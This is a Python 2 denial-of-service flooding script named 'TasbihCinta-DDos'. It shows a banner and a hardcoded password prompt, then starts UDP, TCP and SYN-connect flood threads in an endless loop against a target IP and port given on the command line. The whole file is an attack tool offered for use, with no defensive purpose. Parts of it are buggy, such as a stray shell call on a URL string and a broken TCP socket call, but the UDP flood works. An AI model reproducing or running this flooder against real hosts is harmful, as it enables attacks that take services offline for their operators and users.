#!/usr/bin/env python

import os
import threading
import sys
import time
import random
import socket
import logging

def warna():

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    UNDERLINE = '\033[4m'
    PURPLE = '\033[97m'
    BOLD    = "\033[1m"
    BLACK   = "\033[30m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"

            
os.system("clear")
os.system("\033[101m \033[37mhttps://github.com/ahmadsan272-ship-it/TasbihCinta-DDos\033[0m")
print("\033[104m \033[37mDESICATED FOR FILISTINE\033[0m")
time.sleep(5)
print("Loading.......")

attemps = 0
os.system("clear")
print("""
033[32m

""")



while attemps < 100:
    username = input("\033[32mEnter your username: \033[0m")
    password = input("\033[31mEnter your password: \033[0m")

    if username == 'bp4' and password == 'bp4':
        print("\033[32m⟩⟩ Hai...! Welcome to zona attack BLACKPHANTER \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

if len(sys.argv) < 4:
    print "ddos4"
    sys.exit("Usage: python "+sys.argv[0]+" <ip> <port> <size>")

ip = sys.argv[1]
port = int(sys.argv[2])
size = int(sys.argv[3])
packets = int(sys.argv[3])

class syn(threading.Thread):
    def __init__(self, ip, port, packets):
        self.ip = ip
        self.port = port
        self.packets = packets
        self.syn = socket.socket()
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                self.syn.connect((self.ip, self.port))
            except:
                pass

class tcp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                socket.connect(self.ip, self.port)
                socket.setblocking(0)
                socket.sendto(bytes,(self.ip, self.port))
            except:
                pass

class udp(threading.Thread):
    def __init__(self, ip, port, size, packets):
        self.ip = ip
        self.port = port
        self.size = size
        self.packets = packets
        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        threading.Thread.__init__(self)
    def run(self):
        for i in range(self.packets):
            try:
                bytes = random._urandom(self.size)
                if self.port == 0:
                    self.port = random.randrange(1, 65535)
                self.udp.sendto(bytes,(self.ip, self.port))
            except:
                pass

while True:
    try:
        if size > 65507:
            sys.exit("Invalid Number Of Packets!")
        u = udp(ip,port,size,packets)
        t = tcp(ip,port,size,packets)
        s = syn(ip,port,packets)
        u.start()
        t.start()
        s.start()
    except KeyboardInterrupt:
        print "Stopping Flood!"
        sys.exit()
    except socket.error, msg:
        print "Socket Couldn't Connect"
        sys.exit()
